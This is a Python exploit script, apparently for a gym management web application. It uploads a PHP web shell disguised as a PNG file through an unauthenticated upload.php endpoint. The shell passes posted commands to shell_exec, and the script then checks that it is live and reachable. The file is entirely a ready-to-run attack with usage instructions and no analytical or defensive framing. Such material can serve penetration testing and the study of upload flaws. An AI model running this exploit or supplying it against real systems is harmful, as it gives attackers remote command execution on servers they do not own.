import requests, sys, urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def header():
    print(r'''
            /\
/vvvvvvvvvvvv \--------------------------------------,
`^^^^^^^^^^^^ /============BOKU====================="
            \/
''')

def upload_webshell(server_url):
    print("[*] Uploading webshell...")

    # PHP WebShell code with input form
    webshell_code = '''<?php
if (isset($_POST['cmd'])) {
    echo "<pre>" . shell_exec($_POST['cmd']) . "</pre>";
}
?>
<form method="post">
    <input type="text" name="cmd" style="width:300px;" autofocus />
    <input type="submit" value="Execute" />
</form>'''

    # Construct multipart file data
    files = {
        'file': (
            'kamehameha.php.png',
            webshell_code,
            'image/png',
            {'Content-Disposition': 'form-data'}
        )
    }

    data = {'pupload': 'upload'}
    upload_url = server_url + 'upload.php?id=kamehameha'

    s = requests.Session()
    res = s.post(upload_url, files=files, data=data, verify=False)

    if res.status_code == 200:
        print("[+] Upload request sent.")
    else:
        print("[-] Upload failed with status:", res.status_code)
        sys.exit(1)

    # Check if shell is accessible
    shell_url = server_url + 'upload/kamehameha.php'
    test = s.get(shell_url, verify=False)
    if test.status_code == 200:
        print("[+] WebShell is live at:", shell_url)
        print("[+] Open in browser and use the input box to execute commands.")
    else:
        print("[-] WebShell not found at expected location.")
        sys.exit(1)

if __name__ == '__main__':
    header()
    if len(sys.argv) != 2:
        print("(+) Usage:\t python3 exploit48506_webshell.py <WEBAPP_URL>")
        print("(+) Example:\t python3 exploit48506_webshell.py http://10.0.0.3/gym/")
        sys.exit(1)

    SERVER_URL = sys.argv[1].rstrip('/') + '/'
    upload_webshell(SERVER_URL)
